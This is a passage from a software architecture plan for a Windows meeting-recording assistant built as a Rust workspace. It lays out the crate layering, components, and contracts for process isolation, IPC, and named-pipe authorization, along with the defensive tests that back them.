`deprecated|superseded`. Comparison baseline: writing ADRs directly as `accepted`. Consequence: every ADR this
plan proposes starts at `proposed`; acceptance is a separate, authorised transition, and this planner does not
perform it. Requirements: FR-026.

---

# Components

Every component is `planned` — the repository is greenfield (`recovery.json` evidence coverage: only
`PLAN.md` is tracked). Paths are repository-relative and are the paths Phase 0 will create.

<!-- anchor: component-workspace-layout -->
### component-workspace-layout — Cargo workspace and crate topology

Responsibility: own the crate graph — which crates exist, which are composition roots, and which layer each
belongs to. Owner: `Cargo.toml` (workspace manifest) + `boundary.toml` (layer declaration). Paths:
`Cargo.toml`, `rust-toolchain.toml`, `boundary.toml`, `crates/`, `app/ui/`, `xtask/`. Integration points: every
other component is a crate inside this workspace; `xtask boundary` reads `boundary.toml` and `cargo metadata`.
Test seams: `cargo metadata --format-version 1` output is the machine-readable graph the boundary check
consumes, so the topology is testable without building. Contracts:
`contract-module-boundary-enforcement`.

The declared layers, from bottom to top, with the rule that a crate may depend only on strictly lower layers
and never sideways within its own layer except where noted:

| Layer | Crates | May depend on |
| --- | --- | --- |
| L0 kernel | `ma-core-types` | third-party only |
| L1 contracts | `ma-signal`, `ma-ipc`, `ma-processor`, `ma-destination`, `ma-manifest`, `ma-secure` | L0 |
| L2 domain | `ma-session`, `ma-detect`, `ma-workflow` | L0, L1 |
| L3 infrastructure | `ma-store`, `ma-capture`, `ma-signals-windows`, `ma-ext-channel` | L0, L1, L2 |
| L4 adapters | `ma-adapter-teams`, `ma-adapter-slack`, `ma-adapter-zoom`, `ma-adapter-meet`, `ma-processor-*`, `ma-destination-*` | L0, L1 (contract crates only) |
| L5 composition roots | `ma-engine` (binary), `ma-processor-host` (binary), `app/ui/src-tauri` (binary), `xtask` | anything |

Two further edges are forbidden inside the graph, and they are the ones that carry PLAN §7's
"processing failure never stops the recording path" (see `contract-processing-isolation`):

| Forbidden edge class | Rule |
| --- | --- |
| capture path → processing | `ma-core-types`, `ma-session`, `ma-capture` may not depend on `ma-workflow`, `ma-processor`, `ma-destination` or any `ma-processor-*` / `ma-destination-*` crate, directly or transitively |
| native inference linkage | only `ma-processor-host` and the `ma-processor-*` adapter crates it loads may declare a dependency that links a native inference library (whisper.cpp, sherpa-onnx or any crate whose build script compiles C/C++) |

`ma-engine` is a composition root and therefore *may* depend on `ma-workflow`; the isolation guarantee does
not come from the binary's edge set but from the two rules above plus the child-process boundary that
`contract-processing-isolation` fixes. Stating this explicitly is deliberate: a rule written as
"`ma-engine` must not depend on `ma-workflow`" would be false in a design that hosts the workflow runtime in
the engine process, and a false rule gets deleted the first time it fails.

The load-bearing rule is that **L4 is a sink**: nothing but L5 may depend on an L4 crate. That is exactly the
PLAN exit criterion "meeting-service-specific logic cannot leak into the workflow core", expressed as a graph
property that `cargo metadata` can decide.

<!-- anchor: component-boundary-check -->
### component-boundary-check — repository policy enforcement and verification tiering

Responsibility: decide, mechanically, whether the crate graph and the source text satisfy the declared
boundary policy, whether every declared verification is registered in a tier, and fail CI when either is
false. Owner: `xtask/src/boundary.rs` and `xtask/src/verify.rs`. Paths: `xtask/Cargo.toml`,
`xtask/src/main.rs`, `xtask/src/boundary.rs`, `xtask/src/verify.rs`, `boundary.toml`,
`verification-tiers.toml`, `deny.toml`, `.github/workflows/ci.yml`, `xtask/tests/boundary_negative.rs`,
`xtask/tests/isolation_negative.rs`, `xtask/tests/fixtures/violating-workspace/`.
Integration points: `cargo metadata`, `cargo deny check`, CI. Test seams: the checker takes a workspace root
as an argument, so a fixture workspace containing a deliberate violation can be checked in-process; the tier
runner takes the tier manifest as an argument, so tier composition is testable without a Windows host.
Contracts: `contract-module-boundary-enforcement`, `contract-verification-tiering`,
`contract-processing-isolation` (enforcement site; the contract is owned by `component-capture-engine`).

<!-- anchor: component-core-types -->
### component-core-types — identifiers, timeline arithmetic, error taxonomy

Responsibility: own the vocabulary every other crate shares: identifier types, sample-domain timeline types,
the artifact reference type, and the top-level error taxonomy. Owner: `crates/ma-core-types`. Paths:
`crates/ma-core-types/src/id.rs`, `.../src/timeline.rs`, `.../src/artifact_ref.rs`, `.../src/error.rs`.
Integration points: depended on by every crate; serialized into DB rows, filesystem paths and export payloads.
Test seams: pure library, property-testable (`proptest`) for ordering and round-trip. Contracts:
`contract-stable-identity`, `contract-session-timeline`, `contract-artifact-addressing`.

<!-- anchor: component-session-model -->
### component-session-model — meeting-session state machine and mode policy

Responsibility: own the session lifecycle: declared states, declared transitions with causes, automatic
recording mode policy, countdown and hysteresis deadlines, and the recovery states. Pure: no I/O, no clock
reads, no process control — time enters as an input. Owner: `crates/ma-session`. Paths:
`crates/ma-session/src/state.rs`, `.../src/transition_table.rs`, `.../src/mode.rs`, `.../src/deadline.rs`,
`contracts/session/transitions.json`. Integration points: driven by `ma-detect` decisions and by UI commands
arriving over `ma-ipc`; drives `ma-capture`. Test seams: `step(state, event, now) -> (state, effects)` is a
total function, exhaustively testable; the transition table is exported as JSON and diffed against the code.
Contracts: `contract-session-state-machine`, `contract-recording-mode-policy`,
`contract-consent-surface-precondition`.

<!-- anchor: component-signal-contract -->
### component-signal-contract — signal envelope, collector seam, replayable timeline

Responsibility: own what a signal *is* and how a timeline of signals is recorded and replayed. Collectors
observe; they never decide. Owner: `crates/ma-signal`. Paths: `crates/ma-signal/src/envelope.rs`,
`.../src/source.rs`, `.../src/timeline.rs`, `contracts/signal/signal-envelope.schema.json`,
`fixtures/signal-timelines/`. Integration points: implemented by `ma-signals-windows` and `ma-ext-channel`;
consumed by `ma-detect`. Test seams: `SignalSource` has a fixture-replay implementation in Phase 0, so the
whole detection path is testable with no Windows API at all. Contracts:
`contract-signal-envelope`.

<!-- anchor: component-detector-core -->
### component-detector-core — pure detector, adapter registry, outcome partition

Responsibility: decide whether a meeting session is starting, continuing or ending, from a signal timeline
plus configuration plus the adapter table, and emit decisions that carry the signal ids they used. Contains
zero service-specific knowledge. Owner: `crates/ma-detect`. Paths: `crates/ma-detect/src/detector.rs`,
`.../src/adapter.rs` (trait + registry), `.../src/decision.rs`, `.../src/outcome.rs`. Integration points:
consumes `ma-signal`; registry is populated only by the composition root. Test seams: `decide(&timeline,
&config, &adapters) -> Vec<Decision>` is deterministic and replay-testable against
`fixtures/signal-timelines/`. Contracts: `contract-detector-determinism`,
`contract-detector-outcome-partition`, `contract-module-boundary-enforcement`.

<!-- anchor: component-service-adapters -->
### component-service-adapters — Teams / Slack / Zoom / Meet adapters

Responsibility: hold every service-specific fact (package family names, executable names, host patterns,
version quirks, per-application default mode) behind the `MeetingAdapter` trait, one crate per service, with
no dependencies on each other. Owner: `crates/ma-adapter-<service>`. Paths: `crates/ma-adapter-teams/`,
`crates/ma-adapter-slack/`, `crates/ma-adapter-zoom/`, `crates/ma-adapter-meet/`. Integration points:
registered by `ma-engine` only. Test seams: each adapter is a data table plus a match function, unit-testable
in isolation; a shared conformance test runs the same adapter-contract suite against all four. Unresolved
contracts: `contract-module-boundary-enforcement`, `contract-detector-outcome-partition`.

<!-- anchor: component-extension-channel -->
### component-extension-channel — detection-only browser channel

Responsibility: accept tab-level detection signals from the browser extension over a local channel,
authenticate the peer, and convert accepted messages into ordinary non-authoritative signals. Owner:
`crates/ma-ext-channel`. Paths: `crates/ma-ext-channel/src/server.rs`, `.../src/auth.rs`, `.../src/message.rs`,
`contracts/extension-channel/message.schema.json`. Integration points: produces into `ma-signal`; the
extension itself is Phase 1. Test seams: the server is constructed over an injected transport, so
authentication and rejection paths are testable without a browser. Contracts:
`contract-extension-channel-trust`.

<!-- anchor: component-capture-engine -->
### component-capture-engine — capture source seam, chunk writer, recovery, consolidation

Responsibility: own durable audio. Turn a `CaptureSource` per track into fixed-duration durable chunks, keep
the per-track sample timeline, recover an interrupted session from what is on disk, and consolidate tracks
after the session ends. Owner: `crates/ma-capture` plus the engine binary `crates/ma-engine`. Paths:
`crates/ma-capture/src/source.rs`, `.../src/chunk_writer.rs`, `.../src/manifest.rs`, `.../src/recovery.rs`,
`.../src/consolidate.rs`, `crates/ma-engine/src/main.rs`, `crates/ma-engine/src/supervisor.rs`,
`contracts/artifact/chunk-manifest.schema.json`. Integration points: WASAPI in Phase 1 behind
`CaptureSource`; writes into the artifact root; reports state over `ma-ipc`. Test seams: the Phase 0
`SyntheticSource` emits a deterministic PCM ramp, so chunk boundaries, gaps, kill-recovery and consolidation
are all testable with no audio hardware — including in CI; the supervisor spawns processor hosts through an
injected process launcher, so an aborting child is simulated without a native library. Contracts:
`contract-process-topology`, `contract-chunk-durability`, `contract-session-timeline`,
`contract-track-consolidation`, `contract-processing-isolation`.

<!-- anchor: component-ipc-contract -->
### component-ipc-contract — engine control channel

Responsibility: own the wire contract between UI and engine: method set, event set, version handshake,
reconnect snapshot with sequence numbering, and transport authorization. Owner: `crates/ma-ipc`. Paths:
`crates/ma-ipc/src/protocol.rs`, `.../src/method.rs`, `.../src/event.rs`, `.../src/transport.rs`,
`.../src/authz.rs`, `contracts/ipc/protocol.schema.json`, `contracts/ipc/methods.schema.json`. Integration
points: engine binary serves it; the Tauri backend consumes it. Test seams: the protocol layer is transport
generic, so a duplex in-memory pipe drives both sides in one test process; a separate integration test uses a
real named pipe to cover ACL behaviour. Contracts: `contract-ipc-protocol`,
`contract-ipc-transport-authz`.

<!-- anchor: component-store -->
### component-store — SQLite schema, migrations, writer ownership

Responsibility: own persisted relational state — sessions, chunks, artifacts, workflow steps, exports,
settings — including migration order, schema version, which process may write which table family, and the
deletion path that removes a meeting from all of them. Owner: `crates/ma-store`. Paths:
`crates/ma-store/src/schema.rs`, `.../src/migration.rs`, `.../migrations/*.sql`, `.../src/repo/*.rs`,
`.../src/purge.rs`. Integration points: opened by the engine and by the UI backend; artifacts on disk are
referenced by `(root_id, relative_path)`. Test seams: the store opens against a temp directory, and migration
tests run every migration forward from empty and from each prior version; the purge job takes the artifact
root as an argument so completeness can be asserted by scanning a temp tree. Contracts:
`contract-store-ownership`, `contract-artifact-addressing`,
`contract-stable-identity`, `contract-retention-purge`.

<!-- anchor: component-workflow-core -->
### component-workflow-core — step identity, queue, retry, artifact lifecycle

Responsibility: own post-meeting work: the durable queue, step identity and idempotency, retry
classification, artifact lifecycle transitions, and the separation between generated content and user edits.
Contains no processor or destination specifics. Owner: `crates/ma-workflow`. Paths:
`crates/ma-workflow/src/step.rs`, `.../src/queue.rs`, `.../src/retry.rs`, `.../src/lifecycle.rs`,
`.../src/edits.rs`, `.../src/effect_ledger.rs`. Integration points: consumes `ma-processor` and
`ma-destination` traits; persists via `ma-store`; hosted in the engine process (see
`adr-20260903-workflow-runtime-process-topology`). Test seams: the queue runs against recording fake
processors and destinations, so restart, duplicate enqueue and retry are testable deterministically; the
effect ledger's intent-before-effect ordering is testable by killing between the two writes. Contracts:
`contract-workflow-step-idempotency`, `contract-stable-identity`, `contract-retention-purge`.

<!-- anchor: component-processor-contract -->
### component-processor-contract — transcription / diarization / summarization seam

Responsibility: own the processor trait, capability declaration, staged-input isolation, invocation rules for
external programs, progress and cancellation, provenance, the failure taxonomy including the budget
warning, and the child-process host in which every native or external processor actually runs. Owner:
`crates/ma-processor` plus the host binary `crates/ma-processor-host`. Paths:
`crates/ma-processor/src/lib.rs`, `.../src/capability.rs`, `.../src/staging.rs`, `.../src/progress.rs`,
`.../src/failure.rs`, `.../src/host.rs`, `crates/ma-processor-host/src/main.rs`,
`contracts/processor/processor-manifest.schema.json`. Integration points: implemented in Phase 3 by
whisper.cpp / OpenAI / sherpa-onnx / Claude adapters loaded inside `ma-processor-host`; consumed by
`ma-workflow`. Test seams: a `ScriptedProcessor` fake that can be told to be slow, to fail retryably, to
ignore cancellation (so the contract test can catch it), to exceed budget, or to abort the host process.
Contracts: `contract-processor-interface`, `contract-processor-budget`, `contract-processing-isolation`.

<!-- anchor: component-destination-contract -->
### component-destination-contract — export seam

Responsibility: own the destination trait, export identity, remote-identity reconciliation, retry
classification, and the local egress audit record. Owner: `crates/ma-destination`. Paths:
`crates/ma-destination/src/lib.rs`, `.../src/identity.rs`, `.../src/retry.rs`, `.../src/audit.rs`,
`contracts/destination/destination-descriptor.schema.json`. Integration points: implemented in Phase 4 by
local-folder, Drive and Notion adapters; consumed by `ma-workflow`. Test seams: a fake destination that can
simulate "created remotely but crashed before recording the id", which is the case that produces duplicates.
Contracts: `contract-destination-export-idempotency`, `contract-diagnostic-redaction`.

<!-- anchor: component-security-policy -->
### component-security-policy — secret custody, redaction, ACLs, threat model

Responsibility: own the secret type and its custody, log redaction, filesystem and pipe ACL construction, and
the threat model document that names every trust boundary, and the repository egress inventory that
enumerates every host any component may contact. Owner: `crates/ma-secure` plus `docs/design/threat-model.md`
and `egress-inventory.toml`. Paths: `crates/ma-secure/src/secret.rs`, `.../src/credential_store.rs`,
`.../src/redaction.rs`, `.../src/acl.rs`, `crates/ma-secure/tests/egress_inventory.rs`,
`egress-inventory.toml`, `docs/design/threat-model.md`, `docs/design/credential-policy.md`.
Integration points: used by every crate that touches a token or writes a log; ACL helper used by
`ma-ext-channel` and `ma-ipc`; the egress inventory is read by the destination audit assertion. Test seams: a
redaction test runs a synthetic session end-to-end and greps the emitted log bundle for planted secret and
content markers; the inventory checker takes a workspace root and an inventory path as arguments, so an
undeclared-host fixture is checkable in-process. Contracts: `contract-credential-custody`,
`contract-diagnostic-redaction`, `contract-ipc-transport-authz`, `contract-egress-inventory`.

<!-- anchor: component-release-supply-chain -->
### component-release-supply-chain — signed update and adapter manifests

Responsibility: own manifest schema, Ed25519 verification, rollback protection, key rotation, and the gate
that no manifest-declared path is used before verification succeeds. Owner: `crates/ma-manifest`. Paths:
`crates/ma-manifest/src/manifest.rs`, `.../src/verify.rs`, `.../src/rollback.rs`, `.../src/keys.rs`,
`contracts/manifest/update-manifest.schema.json`, `contracts/manifest/adapter-manifest.schema.json`,
`.github/workflows/release.yml`. Integration points: Tauri updater configuration; adapter activation in the
engine. Test seams: verification takes bytes and a key set as arguments, so tampered, downgraded,
wrong-key and rotated-key manifests are all unit-testable. Contracts:
`contract-release-manifest-trust`.

<!-- anchor: component-ui-shell -->
### component-ui-shell — Tauri shell, consent surface, recording indicator

Responsibility: be the consent and visibility surface: connect to the engine, render authoritative state,
show the countdown with a cancel affordance, show the recording indicator, and send commands. Owns no session
truth. Owner: `app/ui`. Paths: `app/ui/src-tauri/src/main.rs`, `app/ui/src-tauri/src/engine_client.rs`,
`app/ui/src/`, `app/ui/src-tauri/tauri.conf.json`. Integration points: `ma-ipc` client; Tauri updater. Test
seams: `engine_client` is a library over the `ma-ipc` client, so resync behaviour is testable headlessly
without WebView2. Contracts: `contract-consent-surface-precondition`, `contract-ipc-protocol`.

<!-- anchor: component-docs-artifacts -->
### component-docs-artifacts — ADRs, persistent design, change package

Responsibility: record Phase 0's decisions and the durable design discipline in the repository's dev-docs
system, conforming to its schemas. Owner: `docs/`. Paths: `docs/adr/adr-20260903-*.md`, and the five
persistent design documents `docs/design/module-boundaries.md`, `docs/design/session-lifecycle.md`,
`docs/design/recording-artifact-model.md`, `docs/design/threat-model.md`, `docs/design/credential-policy.md`,
`docs/changes/change-20260903-phase0-repository-and-contracts/{requirements,implementation,verification}.md`.
Integration points: dev-docs lint/index (`docs/index/docs.sqlite`). Test seams: schema conformance is a
mechanical check over frontmatter. Contracts: `contract-docs-conformance`.

---

# Implementation contract candidates

Verification tiers used below: **T0** = static/mechanical check that executes no product behaviour (schema
validation, boundary lint, `cargo metadata`, compile-time assertion, frontmatter conformance); **T1** =
deterministic in-process automated test; **T2** = multi-process or system integration test.

<!-- anchor: contract-process-topology -->
### contract-process-topology — engine process lifetime and session ownership

Owner: `component-capture-engine`. Dimension: `state_lifecycle`. Requirements: FR-004, FR-005, FR-017,
FR-030, NFR-003, FR-025. Evidence mode: `total`. Observable scope: `global`.

**Rule.** The capture engine is a per-user background process (`ma-engine.exe`) that is the single authority
for session state. It is started at user logon (registered task) and, if not already running, on demand by the
UI. Its lifetime is independent of the UI: it exits only on an explicit `engine.shutdown` command from an
authorized client, on user logoff, or on an unrecoverable fault — never because a client disconnected. The UI
does not supervise the engine and the engine does not supervise the UI. Exactly one engine instance may exist
per OS user: the instance lock is the successful creation of the control pipe with
`FILE_FLAG_FIRST_PIPE_INSTANCE`; a second engine that fails to acquire it exits without touching any session
directory. Detection and capture both live inside this process, because auto mode must work while no UI is
running, and because a detector living in the UI would stop detecting the moment the window closed.

**Operational inputs.** (1) OS user identity (`authority`, produced externally by Windows, acquired at process
start from the process token, required until shutdown, `capability_bound`, invalidated by logoff → engine
exits). (2) Install location of the engine executable (`versioned_state`, produced by the installer, acquired
at logon-task registration, required until update, `version_bound`; if the path is missing after an update
the logon task registration is repaired at next UI start, and until then auto mode is unavailable and the UI
says so).

**Binary replacement.** The engine binary is not replaced while any session is non-terminal. The rule that
produces that property belongs to the updater and is stated in `contract-release-manifest-trust`; the
*observable* is a property of this process's lifetime, so its check lives here (FR-025, A-10).

**Invariants.** Session truth is written only by the engine. No session directory is opened by two processes
for writing. A client's absence changes no session state. No engine binary swap occurs while a session is
non-terminal.

**Failure semantics.** Engine fault while a session is `recording`: the process exits after flushing the
in-progress chunk if possible; on restart the session is recovered per `contract-chunk-durability` and marked
`interrupted`. Failure to acquire the instance lock: exit code `EngineAlreadyRunning`, no side effects.

**Normal witness.** Given a session in `recording` driven by `SyntheticSource`, when the UI process is
terminated with `TerminateProcess`, then chunk files continue to appear at the declared cadence, the engine's
session state remains `recording`, and a newly started UI observes `recording` with the same `session_id`.

**Adversarial witness** (risk tags: `recovery`, `concurrency`, `repeated_usage`). Given an engine already
running for the user, when a second engine binary is launched (e.g. by double-clicking during an update),
then the second process must exit without creating, renaming or deleting any file under the session
directory; a test asserts the directory mtime set is unchanged. A second, harder case: the engine is killed
mid-chunk while the UI stays connected; the UI must observe the pipe drop and re-resolve state from the
restarted engine rather than keep rendering `recording` from its stale cache.

**Verification.** `v-topology-ui-kill` (T2): kill the UI, assert chunk progression and state.
`v-topology-single-instance` (T2): second instance exits, no filesystem mutation.
`v-topology-engine-restart-resync` (T2): kill the engine, restart, assert recovery and UI resync.
`v-topology-update-deferred-during-session` (T2): an update offered while a session is non-terminal leaves the
running engine binary in place and applies only after the session terminates.

**Process inventory.** The system has exactly three long-lived process kinds and one transient one, and
this table is the closed set — an implementation that adds a fourth long-lived process, or moves a
responsibility between columns, does not satisfy this contract.

| Process | Lifetime | Owns |
| --- | --- | --- |
| `ma-engine.exe` | logon → logoff, one per OS user | detection, capture, session truth, **the workflow runtime** (queue, scheduler, step lifecycle), the export queue, and the `session` / `workflow` / `export` store families |
| `app/ui` (Tauri) | user-launched, closable | consent and library surfaces, the `settings` store family; owns no session truth |
| `ma-processor-host.exe` | one per processing job, killed at job end or cancel | one processor invocation: the native inference library or external program, its staged inputs, and nothing else |
| browser extension host | per browser, detection only | forwarding non-authoritative tab signals |

**Why the workflow runtime lives in the engine** (closing what the drafts carried as OQ-1, OQ-2 and OQ-3;
recorded in `adr-20260903-workflow-runtime-process-topology`). Processing must continue while the UI is
closed, so the UI process is not a candidate. A third dedicated worker process would add a second IPC
surface, a second update unit and a second store-writer set for no property the child-process boundary does
not already give. The reason to keep processing out of the capture process was never CPU sharing — it was
that a native inference library can `abort()` and take the process with it. `contract-processing-isolation`
removes that reason by making **every** native or external processor run in `ma-processor-host.exe`: the
engine's supervisor spawns it per job, bounds it with a job object, cancels it by killing it, and treats its
abnormal exit as a step failure. What remains in the engine is orchestration and SQLite writes, which cannot
abort the process. The capture thread additionally runs at pro-audio priority so a busy scheduler thread
cannot starve it.

**Verification of the isolation claim** is not in this contract: it is `contract-processing-isolation`'s
`v-isolation-processor-abort-keeps-recording` (T2), which aborts a host child mid-job during a synthetic
recording and asserts chunk cadence is unchanged and the session stays `recording`. This contract owns
*where the processes are*; that one owns *what a processing failure may not reach*.

<!-- anchor: contract-processing-isolation -->
### contract-processing-isolation — a processing failure cannot reach the recording path

Owner: `component-capture-engine`. Dimension: `failure_recovery`. Requirements: NFR-009, FR-030, FR-004.
Evidence mode: `total`. Observable scope: `global`.

**Why this contract exists.** PLAN §7 states "processing failure never stops the recording path" and PLAN §9.8
makes it an MVP completion criterion. Carried as prose inside two other contracts it had no requirement id, no
owner and no check — an implementation could violate it and every test would stay green. It is made structural
here, in two independent layers, because either one alone is defeatable.

**Rule, layer 1 — the graph.** `boundary.toml` declares two rule classes that `cargo xtask boundary` enforces
over the `cargo metadata --all-features` graph, transitively:

| Rule | Statement |
| --- | --- |
| `capture-path-isolation` | no crate in the capture-path set (`ma-core-types`, `ma-session`, `ma-capture`) may depend, directly or transitively or through a feature gate, on `ma-workflow`, `ma-processor`, `ma-destination`, `ma-store`, or any `ma-adapter-*` / `ma-processor-*` / `ma-destination-*` crate |
| `native-inference-confinement` | only `ma-processor-host` and the `ma-processor-*` crates it loads may depend on a crate that links a native inference library or whose build script compiles C or C++; the declared native-linking crate list lives in `boundary.toml` and an undeclared build-script crate reaching the capture path is a violation |

`ma-engine` is a composition root and depends on both sides — that is what a composition root is for, and a
rule forbidding it would be a rule the design violates on day one. The isolation does not come from the
binary's edge set; it comes from these two rules plus layer 2.

**Rule, layer 2 — the process.** Every processor invocation that loads a native inference library or executes
an external program runs in `ma-processor-host.exe`, one child per job (FR-030). The engine's supervisor
spawns it, bounds it with a job object (4 GiB), cancels it by killing it, and maps its exit as follows:

| Child outcome | Engine's response |
| --- | --- |
| exit 0 with a well-formed result frame | step `succeeded` |
| non-zero exit, `abort()`, access violation, or job-object kill | `HostCrashed`, step `failed_retryable` for two attempts then `failed_permanent`; **no effect on the session** |
| no progress frame within the **150 s** stall timeout declared by `contract-processor-budget` | killed, step `Retryable{no_progress}` — *not* `HostCrashed`, because the cause is observed rather than inferred from an exit code, and completed work items are preserved for the retry |

The capture thread additionally runs at pro-audio thread priority so that a fully loaded scheduler thread in
the same process cannot starve the audio callback.

**Operational inputs.** Child process exit status and job-object accounting (`versioned_state`, producer
external — the Windows kernel — acquired when the child terminates, required until the step is classified,
`current_lookup`; a status that cannot be read at all is treated as `HostCrashed`, never as success, so an
unreadable outcome can never silently mark work done).

**Invariants.** No crate reachable from the capture path can name a workflow, processor or destination symbol.
No native inference library is loaded into the engine's address space. A processing failure changes exactly
one step's state and zero session state.

**Failure semantics.** Repeated host crashes disable that processor for the meeting with a surfaced typed
error; they never pause capture, never finalize a session and never touch a chunk file.

**Normal witness.** Given a synthetic recording in progress and a transcription step running in a host child,
when the child completes normally, then the session stays `recording`, chunk cadence is unchanged, and the
step is `succeeded`.

**Adversarial witness** (risk tags: `recovery`, `concurrency`, `boundary`, `repeated_usage`). Given a session
in `recording` with chunks appearing every 30 s, when the processor host child is killed with an abort-shaped
exit *while holding a staged input open*, then chunk files continue to appear at the same cadence, the
session state is still `recording`, the step is `failed_retryable`, and the staged directory is cleaned up by
the engine rather than leaked. Second case (graph): adding `ma-workflow` as an optional feature-gated
dependency of `ma-capture` must fail `cargo xtask boundary`, and so must adding a whisper binding crate to
`ma-engine` — a check resolving default features only, or checking direct edges only, passes both and is
therefore not a satisfying implementation.

**Verification.** `v-isolation-capture-path-edges` (T0): `cargo xtask boundary --rule capture-path-isolation`
on the clean workspace. `v-isolation-native-link-confined` (T0):
`cargo xtask boundary --rule native-inference-confinement`. `v-isolation-negative-fixture` (T1): the fixture
workspace plants one violation of each rule and the test asserts exactly those two ids.
`v-isolation-processor-abort-keeps-recording` (T2): the adversarial witness above, driven by a scripted host
that aborts on command.

<!-- anchor: contract-ipc-protocol -->
### contract-ipc-protocol — control-channel methods, events, handshake and resync

Owner: `component-ipc-contract`. Dimension: `integration_contract`. Requirements: FR-005, FR-011, NFR-008.
Evidence mode: `total`. Observable scope: `global`.

**Rule.** JSON-RPC 2.0 over a Windows named pipe, message-mode, one connection per client. The first exchange
is `engine.hello{client_protocol: semver, client_capabilities: [indicator, cancel, notify]}` →
`{engine_protocol, engine_version, session_snapshot, event_seq}`. Major-version mismatch is refused with a
typed error naming the required application version; no partial operation on mismatch. Methods (UI → engine):
`session.snapshot`, `session.start`, `session.stop`, `session.pause`, `session.resume`, `session.discard`,
`session.cancel_arming`, `session.extend_hysteresis`, `mode.set`, `artifact.edit`, `meeting.delete`,
`diagnostics.export`, `engine.shutdown`. `artifact.edit` and `meeting.delete` exist because the engine owns
the `workflow` and `export` store families (see `contract-store-ownership`): the UI may read those tables
directly but may not write them, and deletion additionally has to cancel in-flight steps, which only the
process running them can do.
Events (engine → UI): `session.transition{seq, from, to, cause}`, `capture.level{seq, track, rms}`,
`capture.degraded{seq, reason}`, `arming.tick{seq, remaining_ms}`, `detector.decision{seq, outcome,
evidence}`, `error{seq, typed}`. Every event carries a strictly increasing per-connection `seq`. The event
stream is **not durable**: a reconnecting client calls `session.snapshot` and takes the returned state as
authoritative, discarding any locally inferred state; if a client observes a `seq` gap it must re-snapshot.

**Backpressure.** Event publication must never block the capture path. Each connection has a bounded outbound
queue of **256 events**, of which **64** are reserved for `session.transition`; on overflow of the
general portion, `capture.level` events are dropped oldest-first, but `session.transition` events are never
dropped — if the reserved transition portion would overflow, the connection is closed with `ClientTooSlow`
and the client must reconnect and re-snapshot. Losing a client is always preferable to stalling capture.

**Operational inputs.** Protocol version of the peer (`information`, `single_value`, producer is the peer
component, acquired at handshake, required for the connection's life, `snapshot`; if the peer restarts with a
different version the connection is closed and re-handshaked).

**Invariants.** The UI renders only engine-supplied state. No method has a side effect that is not also
observable in a subsequent `session.snapshot`.

**Failure semantics.** Pipe broken → client reconnects with exponential backoff and re-snapshots. Unknown
method → typed `MethodNotFound` (never a silent no-op). Malformed frame → connection closed, logged with
byte count only (never payload, per `contract-diagnostic-redaction`).

**Normal witness.** A client connects, receives a snapshot showing `idle`, sends `session.start`, and observes
`session.transition{idle → recording}` with `seq` one greater than the snapshot's.

**Adversarial witness** (risk tags: `stale`, `concurrency`, `boundary`). Given a UI that connected while the
session was `idle`, and the UI process is suspended (debugger break) for 90 seconds while the session goes
`arming → recording → ending`, when the UI resumes, then it must not render `idle` or replay stale events as
current: either it has been disconnected with `ClientTooSlow`, or it detects the `seq` gap and re-snapshots.
A test drives exactly this by stalling the client's read loop.

**Verification.** `v-ipc-schema-conformance` (T0): Rust types round-trip every golden fixture in
`contracts/ipc/`. `v-ipc-handshake-mismatch` (T1): major mismatch refused with the typed error.
`v-ipc-resync-after-stall` (T1): stalled client path above. `v-ipc-backpressure-never-stalls-capture` (T2):
a wedged client does not slow chunk production.

**Semantic profile.** `contract_evolution` — triggered because the protocol is a persisted cross-process
surface with two independently updatable sides. The evidence that profile demands is carried here rather than
in a separate compatibility contract: the surface is `engine.hello`, the consumers are the engine and every
client, the compatibility rule is the major-version refusal above, and the baseline/target verification is
`v-ipc-handshake-mismatch`.

<!-- anchor: contract-ipc-transport-authz -->
### contract-ipc-transport-authz — who may speak to the engine

Owner: `component-security-policy` (enforced in `component-ipc-contract`). Dimension: `security_boundary`.
Requirements: FR-006, NFR-001. Evidence mode: `fallible`. Observable scope: `global`.

**Rule.** The pipe is created at `\\.\pipe\MeetingAssistant.engine.<installation-id>` with a DACL granting
only the engine's own user SID (and no ACE for `Everyone`, `Authenticated Users`, `NETWORK` or
`ANONYMOUS`), and with `FILE_FLAG_FIRST_PIPE_INSTANCE` so the name cannot be pre-squatted. On each
connection the engine impersonates the client, compares the client token's user SID with its own, and closes
the connection on mismatch with a security diagnostic recording only the SID string. The client side performs
the mirror check: it resolves the server process via `GetNamedPipeServerProcessId` and then applies the
server-authenticity rule for its own **build channel**, which is compiled in (a `cfg` feature), never a
runtime setting, so a release binary cannot be talked into development behaviour:

| Client channel | Accepts a server when |
| --- | --- |
| `release` | the server image path is the installed engine path **and** the image carries a valid Authenticode signature chaining to the pinned signer |
| `development` | the server image path is under the same cargo target directory as the client image **and** the server process runs under the same user SID; a server that *claims* an installed path is additionally required to carry a valid signature |

Anything else is refused: the client sends no command and surfaces a tamper warning rather than trusting an
impostor that could display a false "not recording" state. The carve-out is deliberately not "skip the
signature check when unsigned" — that would let an attacker downgrade a release client by planting an
unsigned binary. It is "a development client trusts only binaries from its own build tree", which is a
strictly narrower path than the release rule and is unavailable to a release build at all.

Without this rule the contract disables its own verification: `v-authz-pipe-squat` and
`v-topology-ui-kill` both require a UI to attach to an engine, and CI builds are unsigned and live outside
any installed path, so a signature-only rule would make every T2 in this plan unrunnable.

**Operational inputs.** (1) Client access token SID (`authority`, external producer Windows, acquired per
connection, required for the connection's life, `capability_bound`, cannot change mid-connection). (2)
Expected engine image path and signer (`versioned_state`, produced by the installer, acquired at UI start,
`version_bound`; after an update the path may change, so it is re-read per connection attempt; unavailable →
the UI refuses to attach and says so). (3) Build channel (`information`, `single_value`, producer
`component-release-supply-chain` at compile time, acquired at compile time, required for the process's life,
`immutable_value`; it has no unavailable state because a build always has exactly one channel, and it is not
readable from configuration, the environment or the command line — a test asserts no runtime input can
change it).

**Invariants.** No unauthenticated peer ever observes a `session.transition` event or issues a command. The
pipe never exists with a permissive DACL, even transiently.

**Failure semantics.** Impersonation failure is treated as a mismatch (fail closed). A signature check that
cannot be completed (revocation server unreachable, malformed catalogue) is a mismatch for a `release`
client, not a pass. If pipe creation fails because the name exists, the engine exits with
`EngineAlreadyRunning` rather than falling back to a second pipe name.

**Normal witness.** A UI running as the same user connects and receives a snapshot.

**Adversarial witness** (risk tags: `boundary`, `concurrency`). Given a process running as a different local
user on the same machine, when it opens the pipe path, then the open must fail at the OS layer *and*, if it
somehow opens, the SID comparison must close it before any method dispatch — verified by a test that asserts
dispatch is unreachable on mismatch. Second case: a process pre-creates
`\\.\pipe\MeetingAssistant.engine.<installation-id>` before the engine starts; the engine must fail to create
(not silently join) and the UI must reject the impostor server on image-path check.

